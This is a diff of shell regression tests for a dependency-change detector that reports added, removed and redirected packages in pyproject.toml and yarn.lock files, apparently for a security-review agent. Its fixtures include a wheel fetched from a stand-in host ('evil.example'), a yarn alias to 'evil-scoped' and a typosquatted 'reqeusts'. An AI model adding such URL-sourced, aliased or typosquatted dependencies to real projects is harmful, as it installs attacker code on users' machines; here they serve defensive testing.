@@ -340,3 +340,97 @@ GOAL=$(cat "$REPO_ROOT/.flow/goals/issue-217.goal.yaml")
 for REC in DEP_REPLACED DEP_BASELINE_TRUNCATED; do
   assert_contains "$REC" "$GOAL" "the contract names $REC"
 done
+
+# =============================================================================
+# Cycle 5: the record set, not one spelling of one record
+# =============================================================================
+
+# _df_records <output> — the DEP_ADDED/CHANGED/REMOVED lines, sorted, one per
+# line, with locations stripped. Asserting the whole set is what catches a
+# phantom package: cycle 3 asserted `not_contains "DEP_ADDED=test@"` and
+# stayed green while the code emitted `DEP_ADDED=dev@(unpinned)` — the same
+# defect under a name nobody thought to exclude.
+_df_records() {
+  printf '%s\n' "$1" \
+    | grep -E '^DEP_(ADDED|CHANGED|REMOVED)=' \
+    | sed 's/ manifest=.*//' \
+    | sort
+}
+
+_flow_test_begin "a PEP 735 group holding an include-group yields exactly its packages"
+# REGRESSION from cycle 4. The group-vs-name test asked whether every value
+# was a list of strings; an include-group table made that false, so the table
+# was read as name->constraint. Result: a phantom package named after the
+# group, mypy reported as REMOVED while still declared, and an added package
+# fetched from a URL reported nowhere at all.
+OUT=$(_df_case "pyproject.toml" \
+'[dependency-groups]
+test = ["pytest>=7"]
+dev = [{include-group = "test"}, "mypy==1.5.0"]
+' \
+'[dependency-groups]
+test = ["pytest>=7"]
+dev = [{include-group = "test"}, "mypy==1.5.0", "evil-pkg @ https://evil.example/e.whl"]
+')
+assert_equal "DEP_ADDED=evil-pkg@(unpinned)" "$(_df_records "$OUT")" \
+  "exactly one record: the package the change added"
+assert_contains "DEP_REPLACED=evil-pkg" "$OUT" "and its url is reported as a redirect"
+assert_contains "DEP_BASELINE=mypy" "$OUT" "mypy is still a dependency"
+
+_flow_test_begin "a poetry multiple-constraints group yields exactly its packages"
+# The other direction, from cycle 4. Both shapes must hold at once, which is
+# why they live in one test file: a fix for either that breaks the other is a
+# failure here rather than three cycles later.
+OUT=$(_df_case "pyproject.toml" \
+'[tool.poetry.group.dev.dependencies]
+pytest = [{version = "^7.0", python = "<3.8"},]
+' \
+'[tool.poetry.group.dev.dependencies]
+pytest = [{version = "^7.0", python = "<3.8"},]
+reqeusts = [{version = "^1.0", python = ">=3.8"},]
+')
+assert_equal "DEP_ADDED=reqeusts@^1.0" "$(_df_records "$OUT")" \
+  "exactly one record, and the group name is not among them"
+
+_flow_test_begin "a yarn alias under a scoped key names the package that installs"
+# The cycle-4 fixture used an unscoped key, so it could not discriminate a
+# split on the scope's own @. Mutation proved the branch was load-bearing,
+# not that it was right.
+OUT=$(_df_case "yarn.lock" \
+'left-pad@^1.0.0:
+  version "1.0.0"
+' \
+'left-pad@^1.0.0:
+  version "1.0.0"
+
+"@scope/react@npm:evil-scoped@^2.0.0":
+  version "2.0.0"
+')
+assert_equal "DEP_ADDED=@scope/react@2.0.0
+DEP_ADDED=evil-scoped@2.0.0" "$(_df_records "$OUT")" \
+  "both the alias key and the package that installs, and nothing else"
+
+_flow_test_begin "an ordinary scoped package is not read as an alias"
+OUT=$(_df_case "yarn.lock" \
+'left-pad@^1.0.0:
+  version "1.0.0"
+' \
+'left-pad@^1.0.0:
+  version "1.0.0"
+
+"@babel/core@^7.0.0":
+  version "7.1.0"
+')
+assert_equal "DEP_ADDED=@babel/core@7.1.0" "$(_df_records "$OUT")" \
+  "exactly one record for a plain scoped package"
+
+_flow_test_begin "the docs no longer promise a line number every finding carries"
+# TOML findings are cited at file level. Four places still told the agent the
+# location was always `file:line`, so it would invent one.
+for F in agents/security-reviewer.md commands/pr.md commands/review.md references/finding-schema.md; do
+  C=$(cat "$PLUGIN_DIR/$F")
+  assert_not_contains "located at the manifest \`file:line\`." "$C" \
+    "$F does not promise a line unconditionally"
+done
+assert_contains "Do not invent a line number" "$(cat "$PLUGIN_DIR/agents/security-reviewer.md")" \
+  "and the agent is told not to invent one"
